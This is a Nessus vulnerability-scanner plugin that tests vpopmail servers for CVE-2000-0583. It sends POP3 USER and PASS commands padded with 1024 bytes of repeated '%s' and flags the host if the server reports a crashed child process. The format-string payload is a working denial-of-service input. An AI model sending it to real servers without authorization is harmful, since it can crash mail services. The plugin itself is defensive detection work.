#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10463);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0583");
 script_bugtraq_id(1418);
 script_osvdb_id(362);

 script_name(english:"vpopmail vchkpw USER/PASS Command Format String");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a PHP script that is affected
by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote vpopmail server is vulnerable to an input 
validation bug that could allow any user to crash the server 
by providing a specially crafted username." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to vpopmail 4.8 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/07/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/06/26");
 script_cvs_date("$Date: 2015/12/23 21:38:31 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Logs into the pop3 server with a crafted username");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2015 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "qpopper.nasl");
 script_exclude_keys("global_settings/supplied_logins_only");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_service(svc: "pop3", default: 110, exit_on_fail: 1);
fake = get_kb_item("pop3/"+port+"/false_pop3");
if (fake) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(1);

  d = recv_line(socket:soc, length:1024);
  if(!d){close(soc);exit(0);}
  
  c = string("USER ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  if("aack, child crashed" >< d)security_warning(port);
  close(soc);

